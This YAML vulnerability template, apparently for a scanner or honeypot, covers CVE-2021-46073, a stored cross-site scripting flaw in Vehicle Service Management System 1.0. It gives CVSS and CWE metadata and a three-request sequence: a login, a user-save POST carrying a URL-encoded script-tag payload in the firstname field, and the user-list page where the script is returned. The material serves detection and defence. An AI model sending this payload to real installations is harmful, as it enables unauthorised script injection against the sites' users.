id: CVE-2021-46073
info:
  name: Vehicle Service Management System 1.0 - Cross Site Scripting
  author: TenBird
  description: 'Vehicle Service Management System 1.0 contains a cross-site scripting
    vulnerability via the User List section in login panel.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected application.

    '
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  reference:
  - https://github.com/plsanu/Vehicle-Service-Management-System-User-List-Stored-Cross-Site-Scripting-XSS
  - https://www.plsanu.com/vehicle-service-management-system-user-list-stored-cross-site-scripting-xss
  - https://www.sourcecodester.com/php/14972/vehicle-service-management-system-php-free-source-code.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-46073
  - https://github.com/SYRTI/POC_to_review
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cve-id: CVE-2021-46073
    cwe-id: CWE-79
    epss-score: 0.00084
    epss-percentile: 0.34354
    cpe: cpe:2.3:a:vehicle_service_management_system_project:vehicle_service_management_system:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: vehicle_service_management_system_project
    product: vehicle_service_management_system
  tags: cve2021,cve,xss,vms,authenticated,vehicle_service_management_system_project
traps:
- request:
    method: POST
    path: /vehicle_service/classes/Login.php?f=login
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: 'username={{username}}&password={{password}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /vehicle_service/classes/Users.php?f=save
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'firstname=test1%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&lastname=test&username=test&password=test&type=1

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /vehicle_service/admin/?page=user/list
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script> Test</td>
